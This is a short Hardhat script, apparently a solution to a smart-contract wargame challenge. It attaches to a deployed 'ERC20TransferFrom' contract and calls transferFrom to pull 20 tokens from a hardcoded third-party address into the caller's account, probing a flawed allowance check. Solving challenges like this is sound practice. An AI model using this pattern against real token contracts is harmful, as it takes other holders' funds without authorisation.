const { ethers } = require("hardhat");
const eth = ethers.BigNumber.from(10).pow(18);

async function transferFromERC20tokensol() {
  const [myAccount] = await ethers.getSigners();

  const instance = "0x968c95Ed557668421bcD220aD8E590E0A1B36DC2"; // 홈페이지에 나온 컨트랙트 주소

  const MadeERC20tokenProblem = await ethers.getContractFactory(
    "ERC20TransferFrom"
  ); // 홈페이지에 나와있는 문제 코드
  const madeERC20tokenProblem = MadeERC20tokenProblem.attach(instance); // 배포한거에 홈페이지에 나온 컨트랙트 붙이기

  const approveAMioiunt = await madeERC20tokenProblem.allowance(
    "0xc9144f98320ec8b34a8b10b1f76a88739eed57d7",
    myAccount.address
  );
  const num = ethers.BigNumber.from(20).mul(eth);
  await madeERC20tokenProblem.transferFrom(
    "0xc9144f98320ec8b34a8b10b1f76a88739eed57d7",
    myAccount.address,
    num
  );
  console.log(approveAMioiunt, "approveAMioiunt");

  console.log("cool");

  //   const result = madeERC20tokenProblem
  //     .connect(myAccount)
  //     .setWeb3ojt(deployAddress);
  //   console.log(result);
}

async function main() {
  transferFromERC20tokensol();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
